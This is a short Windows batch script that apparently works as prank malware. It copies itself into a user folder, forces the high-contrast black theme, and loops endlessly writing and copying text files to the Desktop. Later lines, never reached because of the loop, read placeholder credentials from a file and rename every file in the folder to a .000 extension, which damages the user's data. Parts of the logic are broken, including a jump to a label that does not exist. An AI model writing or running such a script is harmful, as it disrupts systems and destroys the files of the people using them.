@echo off
color 33
title 000
echo 000
copy 000.bat "C:\Users\Admin" %random%
goto theme
:theme
cd "%systemdrive%\Windows\Resources\Ease of Access Themes"
start hcblack.theme
:000
echo > 000.txt
echo "000" >> 000.txt 
echo "000" >> 000.txt
echo "000" >> 000.txt
copy 000.txt "Desktop"
goto 000
goto user 
:user 
cd "C:\Users\Public"
echo > USN.txt
echo "000" >> USN.txt
echo "000" >> USN.txt
(
set /p user=
set /p pwd=
)<USN.txt
echo %user% %pwd%
goto rename
ren *.* *.000
start 000.html
pause
exit 

